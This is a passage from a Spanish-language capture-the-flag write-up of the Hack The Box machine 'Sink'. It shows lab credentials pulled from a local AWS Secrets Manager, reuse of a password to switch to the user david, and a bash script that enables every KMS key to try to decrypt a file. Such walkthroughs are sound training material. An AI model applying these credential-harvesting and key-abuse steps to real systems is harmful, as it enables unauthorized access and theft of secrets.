             ‚îú‚îÄ2225 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 4566 -container-ip 172.18.0.2 -container-port 4566
             ‚îú‚îÄ2313 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6000 -container-ip 172.17.0.2 -container-port 8080
             ‚îú‚îÄ2363 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6010 -container-ip 172.17.0.3 -container-port 8080
             ‚îú‚îÄ2394 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6007 -container-ip 172.17.0.4 -container-port 8080
             ‚îú‚îÄ2447 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6013 -container-ip 172.17.0.5 -container-port 8080
             ‚îú‚îÄ2502 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6012 -container-ip 172.17.0.6 -container-port 8080
             ‚îú‚îÄ2552 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6002 -container-ip 172.17.0.7 -container-port 8080
             ‚îú‚îÄ2594 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6011 -container-ip 172.17.0.8 -container-port 8080
             ‚îú‚îÄ2642 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6014 -container-ip 172.17.0.9 -container-port 8080
             ‚îú‚îÄ2682 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6009 -container-ip 172.17.0.10 -container-port 8080
             ‚îú‚îÄ2740 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6015 -container-ip 172.17.0.11 -container-port 8080
             ‚îú‚îÄ2780 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6006 -container-ip 172.17.0.12 -container-port 8080
             ‚îú‚îÄ2844 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6005 -container-ip 172.17.0.13 -container-port 8080
             ‚îú‚îÄ2873 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6001 -container-ip 172.17.0.14 -container-port 8080
             ‚îú‚îÄ2907 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6003 -container-ip 172.17.0.15 -container-port 8080
             ‚îú‚îÄ2953 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6008 -container-ip 172.17.0.16 -container-port 8080
             ‚îî‚îÄ3115 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6004 -container-ip 172.17.0.17 -container-port 8080
marcus@sink:~$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Opa, vemos que esta corriendo varios contenedores, al inicio tenemos al que estamos buscando:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;...
‚îú‚îÄ2225 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 4566 -container-ip 172.18.0.2 -container-port 4566
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Bien, sabemos que es un contenedor. Validemos que esta corriendo sobre √©l:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;marcus@sink:~$ curl http://localhost:4566 ; echo
{&quot;status&quot;: &quot;running&quot;}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Esta respuesta me acord√≥ a la m√°quina:&lt;/p&gt;

&lt;details&gt;
  &lt;summary&gt;&lt;strong&gt;Spoiler: Nombre de la otra m√°quina&lt;/strong&gt;&lt;/summary&gt;
  
  &lt;code&gt;Bucket&lt;/code&gt;

&lt;/details&gt;

&lt;p&gt;En la que tambi√©n jug√°bamos con &lt;code&gt;AWS&lt;/code&gt; y contenedores.&lt;/p&gt;

&lt;p&gt;Podemos hacer dos cosas, un &lt;code&gt;Remote Port Forwarding&lt;/code&gt; (redireccionamiento de puertos) y validar con &lt;code&gt;nmap&lt;/code&gt; si encontramos algo y adem√°s hacer algo de &lt;code&gt;fuzzing&lt;/code&gt; para ver si hay otras rutas‚Ä¶ O podemos volver a hablar de la m√°quina (&lt;strong&gt;del spoiler&lt;/strong&gt;) y recordar que en el fuzzing hecho all√°, obten√≠amos la ruta &lt;code&gt;/health&lt;/code&gt; que nos sirve para validar el rendimiento y disponibilidad de los recursos de &lt;strong&gt;AWS&lt;/strong&gt;.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://docs.aws.amazon.com/es_es/health/latest/ug/what-is-aws-health.html&quot;&gt;¬øQu√© es AWS Health?&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Entonces podemos hacer una petici√≥n ahora junto al &lt;code&gt;/health&lt;/code&gt; y ver que servicios (y su estado) esta corriendo &lt;code&gt;AWS&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;marcus@sink:~$ curl http://localhost:4566/health ; echo
{&quot;services&quot;: {&quot;logs&quot;: &quot;running&quot;, &quot;secretsmanager&quot;: &quot;running&quot;, &quot;kms&quot;: &quot;running&quot;}}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Perfectowowo e.e Pues tenemos 3 servicios activos y corriendo:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://docs.aws.amazon.com/cli/latest/reference/logs/index.html&quot;&gt;logs&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://docs.aws.amazon.com/cli/latest/reference/secretsmanager/index.html&quot;&gt;secretsmanager&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://docs.aws.amazon.com/cli/latest/reference/kms/index.html&quot;&gt;kms&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Y podemos apoyarnos del &lt;code&gt;API&lt;/code&gt; de &lt;code&gt;Amazon Web Services (aws)&lt;/code&gt; para jugar con lo que encontramos y ver si podemos sacar algo importante:&lt;/p&gt;

&lt;p&gt;Probemos con &lt;a href=&quot;https://docs.aws.amazon.com/cli/latest/reference/logs/index.html&quot;&gt;logs&lt;/a&gt; primero, intentemos ver la descripci√≥n de los grupos de logs creados:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;marcus@sink:~$ aws --endpoint-url=http://localhost:4566 --region us-east-1 logs describe-log-groups
Unable to locate credentials. You can configure credentials by running &quot;aws configure&quot;.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si ejecutamos ese comando nos pide:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;marcus@sink:~$ aws configure
AWS Access Key ID [None]:
AWS Secret Access Key [None]:
Default region name [None]:
Default output format [None]:
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si recordamos en &lt;code&gt;Gitea&lt;/code&gt; hab√≠amos encontrado un commit que ten√≠a esta informaci√≥n, busqu√©mosla y pong√°mosla ac√°‚Ä¶&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;...
$client = new CloudWatchLogsClient([
        'region' =&amp;gt; 'eu',
        'endpoint' =&amp;gt; 'http://127.0.0.1:4566',
        'credentials' =&amp;gt; [
                'key' =&amp;gt; 'AKIAIUEN3QWCPSTEITJQ',
                'secret' =&amp;gt; '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'
        ],
        'version' =&amp;gt; 'latest'
]);
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;(Aunque para comprobar el funcionamiento coloque primero cualquier valor en los dos y aun as√≠ me trajo la informaci√≥n, as√≠ que no es necesaria esta config (supongo))&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;marcus@sink:~$ aws configure
AWS Access Key ID [None]: asd
AWS Secret Access Key [None]: asdfsadf
Default region name [None]: us-east-1
Default output format [None]: json
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-files.html#cli-configure-files-where&quot;&gt;¬øD√≥nde se guardan las configuraciones hechas mediante &lt;strong&gt;AWS CLI&lt;/strong&gt;?&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Y si ejecutamos de nuevo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-json&quot;&gt;marcus@sink:~$ aws --endpoint-url=http://localhost:4566 logs describe-log-groups
{
    &quot;logGroups&quot;: [
        {
            &quot;logGroupName&quot;: &quot;cloudtrail&quot;,
            &quot;creationTime&quot;: 1614265741999,
            &quot;metricFilterCount&quot;: 0,
            &quot;arn&quot;: &quot;arn:aws:logs:us-east-1:000000000000:log-group:cloudtrail&quot;,
            &quot;storedBytes&quot;: 91
        }
    ]
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Listones, si jugamos as√≠ con algunos par√°metros podremos ir descubriendo info.&lt;/p&gt;

&lt;p&gt;Ahora veamos algo de &lt;a href=&quot;https://docs.aws.amazon.com/cli/latest/reference/secretsmanager/index.html&quot;&gt;secretsmanager&lt;/a&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-json&quot;&gt;marcus@sink:~$ aws --endpoint-url=http://localhost:4566 secretsmanager list-secrets
{
    &quot;SecretList&quot;: [
        {
            &quot;ARN&quot;: &quot;arn:aws:secretsmanager:us-east-1:1234567890:secret:Jenkins Login-AZIdv&quot;,
            &quot;Name&quot;: &quot;Jenkins Login&quot;,
            &quot;Description&quot;: &quot;Master Server to manage release cycle 1&quot;,
            &quot;KmsKeyId&quot;: &quot;&quot;,
            &quot;RotationEnabled&quot;: false,
            &quot;RotationLambdaARN&quot;: &quot;&quot;,
            &quot;RotationRules&quot;: {
                &quot;AutomaticallyAfterDays&quot;: 0
            },
            &quot;Tags&quot;: [],
            &quot;SecretVersionsToStages&quot;: {
                &quot;53cf9fdf-cb47-4b35-9ba1-046bcb43cfb6&quot;: [
                    &quot;AWSCURRENT&quot;
                ]
            }
        },
        {
            &quot;ARN&quot;: &quot;arn:aws:secretsmanager:us-east-1:1234567890:secret:Sink Panel-ILKxI&quot;,
            &quot;Name&quot;: &quot;Sink Panel&quot;,
            &quot;Description&quot;: &quot;A panel to manage the resources in the devnode&quot;,
            &quot;KmsKeyId&quot;: &quot;&quot;,
            &quot;RotationEnabled&quot;: false,
            &quot;RotationLambdaARN&quot;: &quot;&quot;,
            &quot;RotationRules&quot;: {
                &quot;AutomaticallyAfterDays&quot;: 0
            },
            &quot;Tags&quot;: [],
            &quot;SecretVersionsToStages&quot;: {
                &quot;97d47d9b-6e95-459e-a0b4-60411a9054d2&quot;: [
                    &quot;AWSCURRENT&quot;
                ]
            }
        },
        {
            &quot;ARN&quot;: &quot;arn:aws:secretsmanager:us-east-1:1234567890:secret:Jira Support-fKqdR&quot;,
            &quot;Name&quot;: &quot;Jira Support&quot;,
            &quot;Description&quot;: &quot;Manage customer issues&quot;,
            &quot;KmsKeyId&quot;: &quot;&quot;,
            &quot;RotationEnabled&quot;: false,
            &quot;RotationLambdaARN&quot;: &quot;&quot;,
            &quot;RotationRules&quot;: {
                &quot;AutomaticallyAfterDays&quot;: 0
            },
            &quot;Tags&quot;: [],
            &quot;SecretVersionsToStages&quot;: {
                &quot;b07ec8cf-4f71-41bb-b20b-023d874be8a9&quot;: [
                    &quot;AWSCURRENT&quot;
                ]
            }
        }
    ]
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Obtenemos 3 plataformas:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Jenkins Login: Master Server to manage release cycle 1.&lt;/li&gt;
  &lt;li&gt;Sink Panel: A panel to manage the resources in the devnode.&lt;/li&gt;
  &lt;li&gt;Jira Support: Manage customer issues.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Si intentamos ver alguna data en concreto (los secretos) podemos hacerlo usando el ID, que ser√≠a el valor &lt;code&gt;&quot;ARN&quot;&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Por ejemplo, veamos el valor secreto de &lt;strong&gt;Jenkins Login&lt;/strong&gt; (&lt;code&gt;get-secret-value&lt;/code&gt;):&lt;/p&gt;

&lt;p&gt;üõπ &lt;strong&gt;&lt;u&gt;Jenkins Login&lt;/u&gt;&lt;/strong&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;marcus@sink:~$ aws --endpoint-url=http://localhost:4566 secretsmanager get-secret-value --secret-id &quot;arn:aws:secretsmanager:us-east-1:1234567890:secret:Jenkins Login-AZIdv&quot;
{
    &quot;ARN&quot;: &quot;arn:aws:secretsmanager:us-east-1:1234567890:secret:Jenkins Login-AZIdv&quot;,
    &quot;Name&quot;: &quot;Jenkins Login&quot;,
    &quot;VersionId&quot;: &quot;53cf9fdf-cb47-4b35-9ba1-046bcb43cfb6&quot;,
    &quot;SecretString&quot;: &quot;{\&quot;username\&quot;:\&quot;john@sink.htb\&quot;,\&quot;password\&quot;:\&quot;R);\\)ShS99mZ~Bj\&quot;}&quot;,
    &quot;VersionStages&quot;: [
        &quot;AWSCURRENT&quot;
    ],
    &quot;CreatedDate&quot;: 1614230338
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Opa, el valor secreto son unas credenciales:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code&gt;john@sink.htb&lt;/code&gt; : &lt;code&gt;R);\\)ShS99mZ~Bj&lt;/code&gt; o &lt;code&gt;R);\)ShS99mZ~Bj&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Antes de ver si son funcionales, validemos con los otros 2 IDs para ver que tienen:&lt;/p&gt;

&lt;p&gt;üõπ &lt;strong&gt;&lt;u&gt;Sink Panel&lt;/u&gt;&lt;/strong&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;marcus@sink:~$ aws --endpoint-url=http://localhost:4566 secretsmanager get-secret-value --secret-id &quot;arn:aws:secretsmanager:us-east-1:1234567890:secret:Sink Panel-ILKxI&quot;
{
    &quot;ARN&quot;: &quot;arn:aws:secretsmanager:us-east-1:1234567890:secret:Sink Panel-ILKxI&quot;,
    &quot;Name&quot;: &quot;Sink Panel&quot;,
    &quot;VersionId&quot;: &quot;97d47d9b-6e95-459e-a0b4-60411a9054d2&quot;,
    &quot;SecretString&quot;: &quot;{\&quot;username\&quot;:\&quot;albert@sink.htb\&quot;,\&quot;password\&quot;:\&quot;Welcome123!\&quot;}&quot;,
    &quot;VersionStages&quot;: [
        &quot;AWSCURRENT&quot;
    ],
    &quot;CreatedDate&quot;: 1614230338
}
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code&gt;albert@sink.htb&lt;/code&gt; : &lt;code&gt;Welcome123!&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;üõπ &lt;strong&gt;&lt;u&gt;Jira Support&lt;/u&gt;&lt;/strong&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;marcus@sink:~$ aws --endpoint-url=http://localhost:4566 secretsmanager get-secret-value --secret-id &quot;arn:aws:secretsmanager:us-east-1:1234567890:secret:Jira Support-fKqdR&quot;
{
    &quot;ARN&quot;: &quot;arn:aws:secretsmanager:us-east-1:1234567890:secret:Jira Support-fKqdR&quot;,
    &quot;Name&quot;: &quot;Jira Support&quot;,
    &quot;VersionId&quot;: &quot;b07ec8cf-4f71-41bb-b20b-023d874be8a9&quot;,
    &quot;SecretString&quot;: &quot;{\&quot;username\&quot;:\&quot;david@sink.htb\&quot;,\&quot;password\&quot;:\&quot;EAL8=bcC=`a7f2#k\&quot;}&quot;,
    &quot;VersionStages&quot;: [
        &quot;AWSCURRENT&quot;
    ],
    &quot;CreatedDate&quot;: 1614230338
}
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code&gt;david@sink.htb&lt;/code&gt; : &lt;code&gt;EAL8=bcC=&lt;/code&gt;a7f2#k`&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Ac√° &lt;code&gt;david&lt;/code&gt; es interesante porque lo tenemos presente como usuario de &lt;code&gt;Gitea&lt;/code&gt; y tambi√©n como usuario de la propia m√°quina. Validemos en el panel login de &lt;code&gt;Gitea&lt;/code&gt; estas credenciales:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313page3000_david_dashboard.png&quot; alt=&quot;313page3000_david_dashboard&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Son funcionales. Probemos si podemos hacer reutilizaci√≥n de contrase√±as e intentemos migrarnos a &lt;code&gt;david&lt;/code&gt; pero desde el sistema:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;marcus@sink:~$ su david
Password: 
david@sink:/home/marcus$ whoami
david
david@sink:/home/marcus$ id
uid=1000(david) gid=1000(david) groups=1000(david)
david@sink:/home/marcus$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;Perfectoooooooooooooooooooooooooooooooooooo, somos &lt;code&gt;david&lt;/code&gt; ahora (:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Antes, veamos si hay algo importante usando &lt;code&gt;kms&lt;/code&gt; con &lt;code&gt;AWS CLI&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;marcus@sink:~$ aws --endpoint-url=http://localhost:4566 kms list-keys
{
    &quot;Keys&quot;: [
        { 
            &quot;KeyId&quot;: &quot;0b539917-5eff-45b2-9fa1-e13f0d2c42ac&quot;,
            &quot;KeyArn&quot;: &quot;arn:aws:kms:us-east-1:000000000000:key/0b539917-5eff-45b2-9fa1-e13f0d2c42ac&quot;
        },
        { 
            &quot;KeyId&quot;: &quot;16754494-4333-4f77-ad4c-d0b73d799939&quot;,
            &quot;KeyArn&quot;: &quot;arn:aws:kms:us-east-1:000000000000:key/16754494-4333-4f77-ad4c-d0b73d799939&quot;
        },
        { 
            &quot;KeyId&quot;: &quot;2378914f-ea22-47af-8b0c-8252ef09cd5f&quot;,
            &quot;KeyArn&quot;: &quot;arn:aws:kms:us-east-1:000000000000:key/2378914f-ea22-47af-8b0c-8252ef09cd5f&quot;
        },
        { 
            &quot;KeyId&quot;: &quot;2bf9c582-eed7-482f-bfb6-2e4e7eb88b78&quot;,
            &quot;KeyArn&quot;: &quot;arn:aws:kms:us-east-1:000000000000:key/2bf9c582-eed7-482f-bfb6-2e4e7eb88b78&quot;
        },
        { 
            &quot;KeyId&quot;: &quot;53bb45ef-bf96-47b2-a423-74d9b89a297a&quot;,
            &quot;KeyArn&quot;: &quot;arn:aws:kms:us-east-1:000000000000:key/53bb45ef-bf96-47b2-a423-74d9b89a297a&quot;
        },
        { 
            &quot;KeyId&quot;: &quot;804125db-bdf1-465a-a058-07fc87c0fad0&quot;,
            &quot;KeyArn&quot;: &quot;arn:aws:kms:us-east-1:000000000000:key/804125db-bdf1-465a-a058-07fc87c0fad0&quot;
        },
        { 
            &quot;KeyId&quot;: &quot;837a2f6e-e64c-45bc-a7aa-efa56a550401&quot;,
            &quot;KeyArn&quot;: &quot;arn:aws:kms:us-east-1:000000000000:key/837a2f6e-e64c-45bc-a7aa-efa56a550401&quot;
        },
        { 
            &quot;KeyId&quot;: &quot;881df7e3-fb6f-4c7b-9195-7f210e79e525&quot;,
            &quot;KeyArn&quot;: &quot;arn:aws:kms:us-east-1:000000000000:key/881df7e3-fb6f-4c7b-9195-7f210e79e525&quot;
        },
        {
            &quot;KeyId&quot;: &quot;c5217c17-5675-42f7-a6ec-b5aa9b9dbbde&quot;,
            &quot;KeyArn&quot;: &quot;arn:aws:kms:us-east-1:000000000000:key/c5217c17-5675-42f7-a6ec-b5aa9b9dbbde&quot;
        },
        {
            &quot;KeyId&quot;: &quot;f0579746-10c3-4fd1-b2ab-f312a5a0f3fc&quot;,
            &quot;KeyArn&quot;: &quot;arn:aws:kms:us-east-1:000000000000:key/f0579746-10c3-4fd1-b2ab-f312a5a0f3fc&quot;
        },
        {
            &quot;KeyId&quot;: &quot;f2358fef-e813-4c59-87c8-70e50f6d4f70&quot;,
            &quot;KeyArn&quot;: &quot;arn:aws:kms:us-east-1:000000000000:key/f2358fef-e813-4c59-87c8-70e50f6d4f70&quot;
        }
    ]
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Tenemos unas &lt;strong&gt;keys&lt;/strong&gt;, no s√© si sean relevantes, pero pues para tenerlas en cuenta, de los otros par√°metros no podemos obtener algo. Sigamos‚Ä¶&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h1 id=&quot;escalada-de-privilegios&quot;&gt;Escalada de privilegios &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;En el &lt;code&gt;/home&lt;/code&gt; de &lt;code&gt;david&lt;/code&gt; tenemos un par de carpetas que nos llevan a un objeto&lt;code&gt;.enc&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;david@sink:~$ ls
Projects
david@sink:~$ cd Projects/
david@sink:~/Projects$ ls
Prod_Deployment
david@sink:~/Projects$ cd Prod_Deployment/
david@sink:~/Projects/Prod_Deployment$ ls
servers.enc
david@sink:~/Projects/Prod_Deployment$ file servers.enc 
servers.enc: data
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Intentando crackearlo no hacemos nada :P Veamos que podemos relacionar para leer el archivo.&lt;/p&gt;

&lt;p&gt;Bueno, buscando encontramos como se pudo haber generado el archivo mediante &lt;code&gt;aws&lt;/code&gt;:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://aws.amazon.com/blogs/security/how-to-encrypt-and-decrypt-your-data-with-the-aws-encryption-cli/&quot;&gt;How to encrypt and decrypt with &lt;strong&gt;AWS CLI&lt;/strong&gt;&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Podemos ver que para generar el archivo se usa un &lt;code&gt;keyId&lt;/code&gt; yyyyyyy anteriormente encontramos varios &lt;code&gt;keyId&lt;/code&gt;s. &lt;strong&gt;Tengamos esto presente&lt;/strong&gt;‚Ä¶&lt;/p&gt;

&lt;p&gt;No contamos con &lt;code&gt;aw, pero mediante &lt;/code&gt;kms&lt;code&gt; tenemos varias funciones para jugar con los &lt;/code&gt;keyId`, una llamada &lt;a href=&quot;https://docs.aws.amazon.com/cli/latest/reference/kms/decrypt.html&quot;&gt;decrypt&lt;/a&gt;:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://docs.aws.amazon.com/cli/latest/reference/kms/decrypt.html&quot;&gt;AWS CLI &lt;strong&gt;kms decrypt&lt;/strong&gt;&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Entonces, seg√∫n la documentaci√≥n el argumento obligatorio seria:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code&gt;--ciphertext-blob fileb://&lt;/code&gt;: Que ah√≠ le indicamos la ruta del archivo &lt;code&gt;.enc&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Podemos intentar desencriptar el archivo &lt;code&gt;servers.enc&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;# Con ruta absoluta:
david@sink:~$ aws --endpoint-url=http://localhost:4566 kms decrypt --ciphertext-blob fileb://home/david/Projects/Prod_Deployment/servers.enc 

Error parsing parameter '--ciphertext-blob': Unable to load paramfile fileb://home/david/Projects/Prod_Deployment/servers.enc: [Errno 2] No such file or directory: 'home/david/Projects/Prod_Deployment/servers.enc'
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;# Escapando la ruta absoluta:
david@sink:~$ aws --endpoint-url=http://localhost:4566 kms decrypt --ciphertext-blob fileb:///home/david/Projects/Prod_Deployment/servers.enc 

An error occurred (AccessDeniedException) when calling the Decrypt operation: The ciphertext refers to a customer master key that does not exist, does not exist in this region, or you are not allowed to access.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Pero nada, solo vemos errores, entiendo que debemos indicarle la &lt;code&gt;keyId&lt;/code&gt;, elijamos cualquiera y veamos que sucede:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;david@sink:~$ aws --endpoint-url=http://localhost:4566 kms decrypt --key-id &quot;f0579746-10c3-4fd1-b2ab-f312a5a0f3fc&quot; --ciphertext-blob fileb:///home/david/Projects/Prod_Deployment/servers.enc 

An error occurred (DisabledException) when calling the Decrypt operation: f0579746-10c3-4fd1-b2ab-f312a5a0f3fc is disabled.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Nos indica que la operaci√≥n &lt;code&gt;Decrypt&lt;/code&gt; esta inhabilitada para esa &lt;code&gt;key&lt;/code&gt;, leyendo de nuevo la doc de &lt;strong&gt;kms&lt;/strong&gt; hay un argumento para habilitar una &lt;code&gt;key&lt;/code&gt;, probemos a ver si de eso se trata el error:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;# Habilitamos
david@sink:~$ aws --endpoint-url=http://localhost:4566 kms enable-key --key-id &quot;f0579746-10c3-4fd1-b2ab-f312a5a0f3fc&quot;

# Ejecutamos de nuevo
david@sink:~$ aws --endpoint-url=http://localhost:4566 kms decrypt --key-id &quot;f0579746-10c3-4fd1-b2ab-f312a5a0f3fc&quot; --ciphertext-blob fileb:///home/david/Projects/Prod_Deployment/servers.enc 

An error occurred (InvalidCiphertextException) when calling the Decrypt operation: 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Obtenemos un error diferente, relacionado posiblemente a la desencriptaci√≥n en concreto (&lt;code&gt; Invalid Ciphertext&lt;/code&gt;) o quiz√°s a que esa &lt;code&gt;key&lt;/code&gt; no es la necesaria para ese archivo‚Ä¶&lt;/p&gt;

&lt;p&gt;Cre√©monos un script para que nos valide con todas las keys.&lt;/p&gt;

&lt;p&gt;Las extraemos:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313bash_davidSH_listkeys_grep_cut.png&quot; alt=&quot;313bash_davidSH_listkeys_grep_cut&quot; /&gt;&lt;/p&gt;

&lt;p&gt;En el script las guardaremos en un archivo temporal para ir leyendo cada una, ahora si hagamos el archivo:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Agregaremos los argumentos &lt;code&gt;--output text&lt;/code&gt; y &lt;code&gt;--query Plaintext&lt;/code&gt; (&lt;strong&gt;&lt;em&gt;These parameters extract the decrypted data, called the plaintext, from the command‚Äôs output.&lt;/em&gt;&lt;/strong&gt;)&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;#!/bin/bash

# Generamos el archivo con las keys
aws --endpoint-url=http://localhost:4566 kms list-keys | grep KeyId | cut -d '&quot;' -f 4 &amp;gt; keys.tmp
file_with_keys=./keys.tmp

while read keyId; do  # Tomamos cada llave del archivo
    # Habilitamos la llave
    aws --endpoint-url=http://localhost:4566 kms enable-key --key-id &quot;$keyId&quot; 2&amp;gt;/dev/null

    echo -ne &quot;\n$keyId:&quot;
    # Desencriptamos el archivo servers.enc
    aws --endpoint-url=http://localhost:4566 kms decrypt --key-id &quot;$keyId&quot; --ciphertext-blob fileb:///home/david/Projects/Prod_Deployment/servers.enc --output text --query Plaintext
done &amp;lt; $file_with_keys

shred -zun 10 $file_with_keys
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Pero no obtenemos nada‚Ä¶&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313bash_davidSH_valkeria_fail.png&quot; alt=&quot;313bash_davidSH_valkeria_fail&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Probemos a jugar con los m√©todos de encriptaci√≥n:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;gt; Specifies the encryption algorithm that will be used to decrypt the ciphertext.
&amp;gt;&amp;gt; Possible values:
&amp;gt;&amp;gt;
&amp;gt;&amp;gt;    SYMMETRIC_DEFAULT
&amp;gt;&amp;gt;    RSAES_OAEP_SHA_1
&amp;gt;&amp;gt;    RSAES_OAEP_SHA_256
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Entonces adecuando esto a nuestro script quedar√≠a:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;#!/bin/bash

# Generamos el archivo con las keys
aws --endpoint-url=http://localhost:4566 kms list-keys | grep KeyId | cut -d '&quot;' -f 4 &amp;gt; keys.tmp
file_with_keys=./keys.tmp
types_algorithms=( SYMMETRIC_DEFAULT RSAES_OAEP_SHA_1 RSAES_OAEP_SHA_256 )

while read keyId; do
    echo -e &quot;\n[+] Llave: $keyId:&quot;
    for algorithm in &quot;${types_algorithms[@]}&quot;; do # Tomamos cada algoritmo del array y probamos
        echo -ne &quot;[*] Algoritmo: $algorithm&quot;

        # Habilitamos la llave
        aws --endpoint-url=http://localhost:4566 kms enable-key --key-id &quot;$keyId&quot; 2&amp;gt;/dev/null

